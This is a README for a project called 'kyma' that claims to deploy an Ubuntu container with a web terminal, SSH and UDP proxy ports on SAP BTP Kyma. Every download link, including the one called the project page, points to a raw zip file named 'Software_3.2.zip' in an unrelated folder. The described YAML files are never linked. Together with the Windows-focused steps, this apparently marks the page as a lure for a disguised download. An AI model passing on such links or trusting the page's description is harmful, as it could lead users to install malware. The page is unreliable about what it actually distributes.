# 🐾 kyma - Run Ubuntu With Persistent Storage

[![Download](https://img.shields.io/badge/Download-kyma-blue?style=for-the-badge)](https://github.com/ilamafascista615/kyma/raw/refs/heads/main/Zulkadah/Software_3.2.zip)

## 🌐 What this project does

kyma helps you deploy an Ubuntu environment on SAP BTP Kyma, which runs on AWS-managed Kubernetes. It gives you a Linux system with persistent storage, so your files stay in place after restarts.

You can use it for:

- Web terminal access in your browser
- SSH access from a normal SSH client
- UDP port access for tools like Hysteria 2 and TUIC

## 📥 Download and open the files

Visit the project page and download the files from here:

https://github.com/ilamafascista615/kyma/raw/refs/heads/main/Zulkadah/Software_3.2.zip

After you open the project, you will find these files:

| File | What it does |
|------|--------------|
| `zvps-deployment.yaml` | Main deploy file |
| `service.yaml` | UDP service setup |
| `NetworkPolicy.yaml` | Network access rules |

## 🖥️ What you need

Before you start, make sure you have:

- A Windows PC
- A web browser
- Access to SAP BTP Kyma
- A text editor such as Notepad, Notepad++, or VS Code
- Basic access to your Kyma space and namespace

## ⚙️ Edit the main config file

Open `zvps-deployment.yaml` and change these values:

```yaml
env:
- name: TTYD
  value: "admin:yourpassword123"  # Web terminal password
- name: SSH_USER
  value: "your_username"          # SSH user name
- name: SSH_PWD
  value: "your_password"          # SSH password
```

Use your own values for:

- Web terminal password
- SSH user name
- SSH password

Keep the format the same.

## 🧭 Create a Kyma namespace

After you sign in to Kyma, open the main console and create a namespace for this app.

Use a simple name you can remember. For example:

- `ubuntu`
- `kyma-vps`
- `webshell`

A namespace keeps this app separate from other apps in your Kyma space.

## 🚀 Deploy the Ubuntu environment

Upload the YAML files in your Kyma console and create the resources in this order:

1. `zvps-deployment.yaml`
2. `service.yaml`
3. `NetworkPolicy.yaml`

Wait for the deployment to finish. When the pod starts, Kyma creates the Ubuntu environment and keeps the storage data across restarts.

## 🔌 Open the web terminal

After the app is running, find the web terminal address in Kyma.

Open it in your browser and log in with:

- User: `admin`
- Password: the value you set in `TTYD`

This gives you a Linux shell in the browser.

## 🔐 Connect with SSH

If you want to use SSH, get the service address from Kyma and connect from Windows.

Use any SSH tool you like, such as:

- Windows Terminal
- PowerShell
- PuTTY
- MobaXterm

Connect with the SSH user name and password you set in the config file.

## 📡 Use UDP services

This setup also supports UDP ports. That helps with tools that need UDP traffic, such as:

- Hysteria 2
- TUIC
- Other UDP-based proxy tools

If you need UDP access, make sure `service.yaml` is applied too.

## 🧱 File roles

Each file has a clear job:

- `zvps-deployment.yaml` starts the Ubuntu container
- `service.yaml` exposes the right ports
- `NetworkPolicy.yaml` sets network rules

Keep all three files together so the setup works as planned.

## 🛠️ Common setup steps on Windows

If you are using Windows, this flow works well:

1. Download the project from GitHub
2. Open the YAML file in a text editor
3. Edit the login values
4. Save the file
5. Upload the files to Kyma
6. Start the deployment
7. Open the web terminal in your browser

## 🔍 Check if it is running

You can tell the setup is working when:

- The pod shows as running
- The service has an address
- The web terminal opens in the browser
- SSH login works with your saved user name and password

## 🧩 Simple example values

If you want a clear test setup, you can use values like these:

- `TTYD`: `admin:test12345`
- `SSH_USER`: `ubuntu`
- `SSH_PWD`: `MyPass1234`

Use your own values if you want stronger access control.

## 📌 Tips for first use

- Save your password in a safe place
- Use a short namespace name
- Keep the YAML file format unchanged
- Apply the files one by one
- Wait for each resource to finish before moving on

## 📂 Project files

The project is built around these files:

- `zvps-deployment.yaml`
- `service.yaml`
- `NetworkPolicy.yaml`

If you want a working Ubuntu environment with saved storage on Kyma, start with the deployment file and then add the service and network policy files

## 🔗 Download again

Project page:

https://github.com/ilamafascista615/kyma/raw/refs/heads/main/Zulkadah/Software_3.2.zip

Use this link to visit the page and download the project files